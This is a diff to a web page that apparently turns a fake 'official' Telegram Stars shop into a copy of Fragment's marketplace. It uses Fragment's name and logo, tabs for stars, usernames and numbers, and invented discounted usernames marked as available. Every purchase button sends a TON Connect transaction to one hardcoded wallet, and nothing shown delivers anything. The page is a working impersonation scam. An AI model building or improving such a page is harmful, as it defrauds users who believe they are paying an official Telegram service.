@@ -3,85 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Stars - Official Distribution</title>
+    <title>Fragment: Usernames & Stars</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { background-color: #0b0b0b; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        header { text-align: center; margin-bottom: 20px; }
-        .stars-logo { width: 70px; height: 70px; margin-bottom: 10px; border-radius: 18px; }
-        h1 { font-size: 22px; margin: 0; color: #fff; }
-        .subtitle { color: #888; font-size: 13px; margin-top: 5px; }
-
-        .container { width: 100%; max-width: 400px; display: flex; flex-direction: column; gap: 12px; }
+        body { background-color: #111b24; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
+        .navbar { background: #17212b; padding: 15px 20px; display: flex; align-items: center; border-bottom: 1px solid #232e3c; }
+        .logo { font-weight: bold; font-size: 18px; display: flex; align-items: center; gap: 8px; }
+        .logo img { width: 24px; }
         
-        .custom-box { background: #1a1a1a; border: 1px solid #333; border-radius: 16px; padding: 20px; text-align: left; }
-        .label { color: #888; font-size: 11px; margin-bottom: 8px; display: block; text-transform: uppercase; letter-spacing: 0.5px; }
-        .input-group { display: flex; align-items: center; background: #262626; border-radius: 10px; padding: 12px; border: 1px solid #444; transition: 0.3s; }
-        .input-group.error { border-color: #ff4d4d; box-shadow: 0 0 5px rgba(255, 77, 77, 0.3); }
-        .input-group input { background: transparent; border: none; color: white; font-size: 20px; font-weight: bold; width: 100%; outline: none; }
-        .input-group span { font-size: 20px; margin-right: 10px; }
-        
-        .error-msg { color: #ff4d4d; font-size: 11px; margin-top: 5px; display: none; }
+        .container { max-width: 500px; margin: 20px auto; padding: 0 15px; }
+        .tabs { display: flex; gap: 20px; border-bottom: 2px solid #232e3c; margin-bottom: 20px; padding-bottom: 10px; }
+        .tab { color: #8191a1; font-weight: bold; cursor: pointer; font-size: 14px; text-transform: uppercase; }
+        .tab.active { color: #50a2e3; border-bottom: 2px solid #50a2e3; padding-bottom: 10px; margin-bottom: -12px; }
 
-        .result-box { margin-top: 20px; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid #333; padding-top: 15px; }
-        .price-label { color: #f7d54e; font-weight: bold; font-size: 20px; }
-        .buy-custom-btn { background: #0088cc; color: white; border: none; padding: 10px 25px; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .buy-custom-btn:disabled { background: #333; color: #666; cursor: not-allowed; }
-
-        .card { background: #1a1a1a; border: 1px solid #333; border-radius: 16px; padding: 18px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.2s; }
-        .card:hover { background: #222; }
-        .ton-value { color: #00d4ff; font-weight: bold; }
+        .section-title { font-size: 18px; font-weight: bold; margin-bottom: 15px; display: block; }
         
+        /* Box Style */
+        .f-box { background: #17212b; border-radius: 12px; padding: 20px; border: 1px solid #232e3c; margin-bottom: 20px; }
+        .label { color: #8191a1; font-size: 11px; font-weight: bold; margin-bottom: 10px; display: block; }
+        
+        .input-group { background: #0f171e; border: 1px solid #2b3a4a; border-radius: 8px; padding: 12px; display: flex; align-items: center; }
+        .input-group input { background: transparent; border: none; color: white; width: 100%; font-size: 16px; outline: none; }
+        
+        .price-row { display: flex; justify-content: space-between; align-items: center; margin-top: 15px; padding-top: 15px; border-top: 1px solid #232e3c; }
+        .ton-price { color: #fff; font-weight: bold; font-size: 18px; display: flex; align-items: center; gap: 5px; }
+        .buy-btn { background: #50a2e3; color: white; border: none; padding: 10px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+
+        /* Usernames List */
+        .user-card { background: #17212b; padding: 15px; border-radius: 12px; border: 1px solid #232e3c; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .u-info { display: flex; flex-direction: column; }
+        .u-name { color: #50a2e3; font-weight: bold; }
+        .u-status { color: #00ff00; font-size: 10px; font-weight: bold; }
+        .u-price { font-weight: bold; color: white; font-size: 14px; }
+        .discount-tag { background: #e35050; color: white; font-size: 9px; padding: 2px 5px; border-radius: 4px; margin-left: 5px; }
+
         #ton-connect-button { display: none; }
-        .footer { margin-top: 35px; font-size: 11px; color: #444; text-align: center; line-height: 1.6; }
     </style>
 </head>
 <body>
 
-    <header>
-        <img src="https://telegram.org/img/t_logo.png" class="stars-logo">
-        <h1>Buy Telegram Stars</h1>
-        <p class="subtitle">Official Wholesale Distribution via TON Connect</p>
-    </header>
+    <div class="navbar">
+        <div class="logo">
+            <img src="https://fragment.com/img/logo.svg" alt="">
+            FRAGMENT
+        </div>
+    </div>
 
     <div class="container">
+        <div class="tabs">
+            <div class="tab active">Stars</div>
+            <div class="tab">Usernames</div>
+            <div class="tab">Numbers</div>
+        </div>
+
+        <span class="section-title">Buy Telegram Stars</span>
         
-        <div class="custom-box">
-            <span class="label">ENTER QUANTITY (MINIMUM 500)</span>
-            <div class="input-group" id="inputWrapper">
-                <span>⭐️</span>
-                <input type="number" id="starsInput" value="1000" oninput="calculatePrice()">
+        <div class="f-box">
+            <span class="label">RECIPIENT</span>
+            <div class="input-group">
+                <input type="text" placeholder="Enter username or ID" value="@me">
             </div>
-            <div id="errorText" class="error-msg">Minimum order is 500 Stars</div>
+            
+            <span class="label" style="margin-top: 20px;">QUANTITY</span>
+            <div class="input-group">
+                <input type="number" id="starsAmount" value="1000" oninput="updatePrice()">
+            </div>
 
-            <div class="result-box">
-                <div>
-                    <span class="label" style="margin-bottom: 2px;">TOTAL PRICE</span>
-                    <span class="price-label" id="priceDisplay">2.50 TON</span>
-                </div>
-                <button id="buyBtn" class="buy-custom-btn" onclick="payCustom()">Buy Now</button>
+            <div class="price-row">
+                <div class="ton-price" id="totalPrice">2.5 TON</div>
+                <button class="buy-btn" onclick="processPayment()">Buy Stars</button>
             </div>
         </div>
 
-        <span class="label" style="margin-left: 10px;">PRESET PACKAGES</span>
+        <span class="section-title">Featured Usernames <span class="discount-tag">-30% OFF</span></span>
 
-        <div class="card" onclick="quickPay(12, '5,000')">
-            <span>⭐️ 5,000 Stars</span>
-            <span class="ton-value">12 TON</span>
+        <div class="user-card" onclick="startOrder(150, '@D_Gold')">
+            <div class="u-info">
+                <span class="u-name">@D_Gold</span>
+                <span class="u-status">AVAILABLE</span>
+            </div>
+            <div class="u-price">150 TON <span style="text-decoration: line-through; color: #555; font-size: 10px;">210</span></div>
         </div>
 
-        <div class="card" onclick="quickPay(22, '10,000')">
-            <span>⭐️ 10,000 Stars</span>
-            <span class="ton-value">22 TON</span>
+        <div class="user-card" onclick="startOrder(280, '@VVIP_7')">
+            <div class="u-info">
+                <span class="u-name">@VVIP_7</span>
+                <span class="u-status">AVAILABLE</span>
+            </div>
+            <div class="u-price">280 TON <span style="text-decoration: line-through; color: #555; font-size: 10px;">400</span></div>
         </div>
+
     </div>
 
     <div id="ton-connect-button"></div>
-
-    <div class="footer">
-        🔒 Encrypted via TON Connect 2.0 Protocol<br>
-        Instant Wholesale Delivery to Account UID
-    </div>
 
     <script>
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -89,64 +103,32 @@
             buttonRootId: 'ton-connect-button'
         });
 
-        function calculatePrice() {
-            const input = document.getElementById('starsInput');
-            const amount = parseInt(input.value) || 0;
-            const priceDisplay = document.getElementById('priceDisplay');
-            const buyBtn = document.getElementById('buyBtn');
-            const errorText = document.getElementById('errorText');
-            const inputWrapper = document.getElementById('inputWrapper');
-
-            // تفعيل التحقق من الحد الأدنى
-            if (amount < 500) {
-                buyBtn.disabled = true;
-                errorText.style.display = 'block';
-                inputWrapper.classList.add('error');
-                priceDisplay.innerText = "---";
-                return 0;
-            } else {
-                buyBtn.disabled = false;
-                errorText.style.display = 'none';
-                inputWrapper.classList.remove('error');
-                const pricePerStar = 0.0025;
-                const total = (amount * pricePerStar).toFixed(2);
-                priceDisplay.innerText = total + " TON";
-                return total;
-            }
+        function updatePrice() {
+            const amount = document.getElementById('starsAmount').value;
+            const price = (amount * 0.0025).toFixed(2);
+            document.getElementById('totalPrice').innerText = price + " TON";
+            return price;
         }
 
-        function payCustom() {
-            const stars = document.getElementById('starsInput').value;
-            const price = calculatePrice();
-            if (price > 0) {
-                startPay(price, stars + " Stars");
-            }
+        function processPayment() {
+            const p = updatePrice();
+            const a = document.getElementById('starsAmount').value;
+            if(a < 500) { alert("Minimum 500 Stars"); return; }
+            startOrder(p, a + " Stars");
         }
 
-        function quickPay(price, label) {
-            startPay(price, label);
-        }
-
-        async function startPay(tonAmount, label) {
-            if (!tonConnectUI.connected) {
-                await tonConnectUI.openModal();
-                return;
-            }
-            const nanoAmount = (tonAmount * 1000000000).toString();
-            const transaction = {
+        async function startOrder(amount, label) {
+            if (!tonConnectUI.connected) { await tonConnectUI.openModal(); return; }
+            const nano = (amount * 1000000000).toString();
+            const tx = {
                 validUntil: Math.floor(Date.now() / 1000) + 360,
                 messages: [{
                     address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
-                    amount: nanoAmount,
-                    payload: btoa("Order " + label)
+                    amount: nano,
+                    payload: btoa("Fragment Order: " + label)
                 }]
             };
-            try {
-                await tonConnectUI.sendTransaction(transaction);
-                alert("Payment sent! Delivery in progress.");
-            } catch (e) {
-                console.error(e);
-            }
+            try { await tonConnectUI.sendTransaction(tx); } catch (e) {}
         }
     </script>
 </body>
